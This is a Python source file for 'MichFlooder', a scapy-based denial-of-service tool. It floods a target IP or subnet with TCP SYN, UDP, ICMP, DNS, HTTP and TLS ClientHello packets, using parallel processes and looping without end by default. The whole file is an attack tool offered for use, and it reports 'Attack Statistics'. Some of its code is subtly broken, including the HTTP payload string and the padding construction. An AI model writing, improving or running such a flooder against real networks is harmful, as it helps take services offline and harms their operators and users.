from datetime import timedelta
from os import urandom, cpu_count
from argparse import ArgumentParser
from multiprocessing import Process
from time import strftime, localtime, time

from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.layers.dns import DNS, DNSQR
from scapy.volatile import RandInt, RandShort, RandChoice, RandIP
from scapy.layers.inet import IP, TCP, UDP, ICMP

def now():
    return strftime("%H:%M:%S", localtime())

l4generators = {
    "tcp":  lambda dports: TCP(sport=RandShort(), dport=RandChoice(*dports), flags="S", seq=RandInt()),
    "udp":  lambda dports: UDP(sport=RandShort(), dport=RandChoice(*dports)),
    "icmp": lambda _: ICMP(id=RandShort(), seq=RandShort())
}

l7generators = {
    "dns": lambda domain: DNS(id=RandShort(), rd=1, qd=DNSQR(qname=domain)),
    "http": lambda domain: Raw(load=
        f"GET / HTTP/1.1\r\n" +
        f"Host: {domain}\r\n" if domain else "" +
        f"User-Agent: MichFlooder\r\n" +
        f"Connection: close\r\n\r\n"),
    "https": lambda _: Raw(load=
        b"\x16\x03\x01\x00\x2e\x01\x00\x00\x2a\x03\x03" +
        urandom(32) + b"\x00\x00\x02\x00\x3c\x01\x00\x00\x00"
    )
}

def send_packets(thread_num, packets, interval, count):
    print(f"[{now()}] Thread #{thread_num} started...", flush=True)
    if count:
        send(packets, verbose=False, inter=interval, count=count)
        print(f"[{now()}] Thread #{thread_num} sent {count} packets.", flush=True)
    else:
        send(packets, verbose=False, inter=interval, loop=True)

def parse_ports(port_str):
    ports = set()
    for part in port_str.split(','):
        if '-' in part:
            start, end = part.split('-')
            start = int(start) if start else 1
            end = int(end) if end else 65535
            ports.update(range(start, end + 1))
        else:
            ports.add(int(part))
    return ports

def parse_args():
    parser = ArgumentParser()

    parser.add_argument("target", help="Target IP/CIDR (e.g. 192.168.1.0/24)")

    parser.add_argument("-p", "--port", help="Target port(s), Nmap style: 80,443 or 20-25")
    parser.add_argument("-n", "--count", type=int, help="Number of packets to send (default: infinite)")
    parser.add_argument("-s", "--size", type=int, default=0, help="Packet size in bytes (max: 1450)")
    parser.add_argument("-t", "--threads", type=int, default=cpu_count(), help="Number of threads (default: all)")
    parser.add_argument("-i", "--interval", type=float, default=0, help="Interval between packets in seconds (e.g. 0.1) (default: 0)")
    parser.add_argument("-d", "--domain", help="Domain to query (only, and must, for dns)")

    proto_group = parser.add_argument_group("Protocol", "Choose one of the following protocols to use", argument_default="icmp")
    protocol = proto_group.add_mutually_exclusive_group()
    protocol.add_argument("-P", "--ICMP", "--PING", action="store_const", const="icmp", dest="protocol", help="Use ICMP (Ping) (default)")
    protocol.add_argument("-T", "--TCP", action="store_const", const="tcp", dest="protocol", help="Use TCP SYN")
    protocol.add_argument("-U", "--UDP", action="store_const", const="udp", dest="protocol", help="Use UDP")
    protocol.add_argument("-D", "--DNS", action="store_const", const="dns", dest="protocol", help="Use DNS over UDP")
    protocol.add_argument("-H", "--HTTP", action="store_const", const="http", dest="protocol", help="Use HTTP over TCP")
    protocol.add_argument("-S", "--HTTPS", action="store_const", const="https", dest="protocol", help="Use HTTP over TCP")

    args = parser.parse_args()

    if not args.port:
        if args.protocol == "dns":
            args.port = "53"
        elif args.protocol == "http":
            args.port = "80"
        elif args.protocol == "https":
            args.port = "443"
        elif args.protocol == "icmp":
            args.port = "0"
        else:
            parser.error("TCP/UDP requires --port.")
    elif args.protocol == "icmp" and args.port != "0":
            parser.error("--port (-p) not allowed with ICMP.")

    if args.size > 1450:
        parser.error("Min packet size cannot exceed 1450 bytes.")

    if args.count and args.threads > args.count:
        args.threads = args.count

    return args

def get_generators(protocol):
    return {
        "tcp" : (l4generators["tcp"], None),
        "udp" : (l4generators["udp"], None),
        "icmp" : (l4generators["icmp"], None),
        "dns" : (l4generators["udp"], l7generators["dns"]),
        "http" : (l4generators["tcp"], l7generators["http"]),
        "https" : (l4generators["tcp"], l7generators["https"])
    }.get(protocol)

def gen_packet(destination_ips, ports, protocol, domain, min_size):
    l4func, l7func = get_generators(protocol)
    ip_layer = IP(dst=RandIP(destination_ips))
    l4_layer = l4func(ports)
    l7_layer = l7func(domain) if l7func else Raw()
    packet_size = len(ip_layer / l4_layer / l7_layer)
    payload_size = max(0, min_size - packet_size)
    payload = Raw(load=payload_size)
    return ip_layer / l4_layer / l7_layer / payload

def print_stats(start_time, packet_count, threads, packet_size):
    end_time = time()
    start_str = strftime('%H:%M:%S', localtime(start_time))
    end_str = strftime('%H:%M:%S', localtime(end_time))
    elapsed_time = end_time - start_time
    elapsed_time_str = str(timedelta(seconds=int(elapsed_time)))

    print("\n===== Attack Statistics =====")
    print(f"Start Time   : {start_str}")
    print(f"End Time     : {end_str}")
    print(f"Time Taken   : {elapsed_time_str}")

    if packet_count:
        packets_sent = packet_count * threads
        total_MB = (packet_size * packets_sent) / (1024 ** 2)
        print(f"Packets Sent : {packets_sent:,}")
        print(f"Total Volume : {total_MB:.2f} MB")
        print(f"Avg          : {total_MB / elapsed_time:,.2f} MB/s")
        print(f"               {packets_sent / elapsed_time:,.2f} PPS")

def main():
    print("\n======================")
    print("==                  ==")
    print("== MichFlooder v1.0 ==")
    print("==  By MichelCohen  ==")
    print("==                  ==")
    print("======================\n")

    args = parse_args()
    print('\n'.join(f"{k:<9} = {v}" for k, v in vars(args).items() if v))

    ports = parse_ports(args.port) if args.port else None
    packet = gen_packet(args.target, ports, args.protocol, args.domain, args.size)
    packet_count = args.count // args.threads if args.count else None

    input(f"Press Enter to start sending...")
    print(f"\n[{now()}] Sending packets...\n")
    start_time = time()

    processes = []
    for thread_num in range(args.threads):
        process = Process(
            target=send_packets,
            args=(thread_num, packet, args.interval*args.threads, packet_count)
        )
        process.start()
        processes.append(process)

    try:
        for process in processes:
            process.join()
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected! Terminating...")
        for process in processes:
            process.terminate()
        for process in processes:
            process.join()

    print_stats(start_time, packet_count, args.threads, len(packet))

if __name__ == "__main__":
    main()
